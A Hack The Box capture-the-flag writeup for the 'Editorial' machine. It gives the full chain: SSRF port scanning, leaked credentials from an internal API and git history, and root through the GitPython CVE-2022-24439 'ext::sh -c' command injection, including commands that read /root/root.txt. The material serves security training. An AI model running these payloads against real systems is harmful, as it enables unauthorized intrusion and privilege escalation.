---
title: "Hack The Box: Editorial"
description: "Guia completa paso a paso de como resolver la maquina Editorial de Hack The Box"
date: 2026-18-06
creator: "Lanz"
rating: 4.3 
dificultad: "Facil"
author: "Ghxstsec"
draft: false
type: "post"
---

Editorial | Hack The Box Writeup
================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Dqg7yji-ny-DYeYUCjopDQ.png)

Ladies and Gentlemen, here you have this Write Up, enjoy.

Starting With Enumeration
-------------------------

Port Discovery: NMAP

![Command used: nmap -sC -sV -T4 -v — min-rate 5000 -Pn 10.10.11.20](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YeeQm_Jrs3OfePCL2EZu-A.png)

Website Testing
---------------

We can see an HTTP port open, 80, let’s see:

![Website Landing Page](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gI4rYYnfqAXJafKLvAUi0A.png)

We can see a editorial website with some books published, but, something calls my attention, the ‘Publish with Us’ Tab:

![Publish Your Book With Us — Editorial Tiempo Arriba](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wkLTP7DHP0EhZQod25y1TA.png)

Hmm, you can upload files, let’s see if its blocked by file extension, Pull out your reverse shells!

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*huzEKEhLVdqItR3X2x4rsA.png)

Click preview, and open the image in a new tab.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I-_Zp_wNnMzJJzfNEpprnQ.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RD6WyBnRlanCmz2hnIrKtA.png)

Where’s my reverse? 😣 well, file renamed and file extension removed, probably a **SSRF?**

WHAT WE ARE EXPLOITING: SERVER SIDE REQUEST FORGERY (SSRF)
----------------------------------------------------------

Open your burpsuites, in the book information tab, write localhost. (127.0.0.1)

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Edvc7m4UHXoKHl6Gv8WARQ.png)

Intercept the request, Click preview, and send it to the repeater.

# Request:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*c0aQe1fUUxOmkZhdl49Xwg.png)

# Response:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*huWICTLLJLp_CiJN3RazLQ.png)

The response is showing clearly a .jpeg file, an image.

Possibly this machine has another port running locally, let’s bruteforce, use burp intruder, scan all ports from 1–65535.

Attack Location:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8vVv_1-2zvSCgudSmqsIyw.png)

Attack settings:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9AHBldNBfnhPLGbMKdw-VA.png)

Aaaaand, attack, this is going to be long.

if you havent go to the bed waiting for the attack, you can see the port 5000 is responsive

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 18 Jul 2024 10:55:44 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 61
/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```

Download the file:

```
{
  "messages": [    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Oh, Port 5000 has an API endpoint

SSH CREDENTIAL LEAK
-------------------

Request:

```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------312307498531384090733427943819
Content-Length: 401
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.htb/upload
-----------------------------312307498531384090733427943819
Content-Disposition: form-data; name="bookurl"
http://127.0.0.1:5000/api/latest/metadata/messages/authors
-----------------------------312307498531384090733427943819
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream
-----------------------------312307498531384090733427943819--
```

You will have another file, download it and read it

Aaaaaand boom.

```
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

**Connect with SSH**

user: dev

password: dev080217_devAPI!@

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lZDXET59B0mpYcDX2kpllw.png)

USER FLAG
---------

![ls command](https://miro.medium.com/v2/resize:fit:550/format:webp/1*-zaWALRQOJO5buu4JCSN6Q.png)

User Prod
---------

![captionless image](https://miro.medium.com/v2/resize:fit:932/format:webp/1*7Cz88zmWrYY3mdz4fxZzCg.png)

You can see the apps folder, inside we have a hidden folder called ‘.git’

### .GIT ENUMERATION

Let’s see the git logs, type git log to see the last commits.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RT8tiRyubXBKRf5zgAHa-A.png)

### · Prod user credentials

Use git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae to read the contents before the downgrade

```
commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500
..........................................................................
+# -- : (development) mail message to new authors
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+    }) # TODO: replace dev credentials when checks pass

```
```
dev@editorial:~/apps$ su prod
Password: 080217_Producti0n_2023!@
prod@editorial:/home/dev/apps$
```

Write cd, to go to the user home folder.

let’s see if prod can execute any libraries as root

```
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

he can,

let’s see what clone_prod_change.py can do.

It uses a vulnerable library that has an RCE vuln, GitPython 3.1.29.

We search in GTFOBins, but no good luck.

Exploiting the vulnerability
----------------------------

### [CVE-2022–24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858) using this you can execute commands as the root user.

command:

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
```

Result:

```
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned' 
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.
Please make sure you have the correct access rights
and the repository exists.
```

Is this an error? No, the command has been succesfully executed by the Root user

### Root.txt

We can read the /root/root.txt by entering this:

```
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root' 
prod@editorial:/opt/internal_apps/clone_changes$ cat /tmp/root    
f7ff9630ff4ad09 
```

*   Only the half of the flag is displayed, no cheating allowed*

Thank you so much for reading and Good luck testing with harder CTF’s 😁

```
👋 Sobre el autor

¡Hola! Soy Ghxstsec, un entusiasta de la ciberseguridad y pentester. Me dedico a documentar mi viaje por el complejo mundo de la seguridad ofensiva.

Actualmente, poseo las certificaciones eJPTv2, eCPPTv3 y Google Cybersecurity Professional Certificate. Mi objetivo es intentar ayudar a sobrellevar la brecha entre el aprendizaje teórico y la práctica, al tiempo que comparto mis experiencias sinceras con la comunidad. Cuando no estoy en una maratón de exámenes de 24 horas, me puedes encontrar haciendo ejercicios en Try Hack Me o investigando los últimos artículos sobre ciberseguridad.

✉️ Conéctate conmigo:

LinkedIn: [LinkedIn](https://www.linkedin.com/in/joel-morillas-aka-ghxstsec-16a988260/)
GitHub: [GitHub](https://github.com/Ghxstsec)
Twitter/X: [Twitter](https://x.com/Louikizz)
Try Hack Me: [THM](https://tryhackme.com/p/Ghxstsec)

¡Muchas gracias por leer todo el artículo! ¡Te deseo mucha suerte en tus próximos logros! 😊
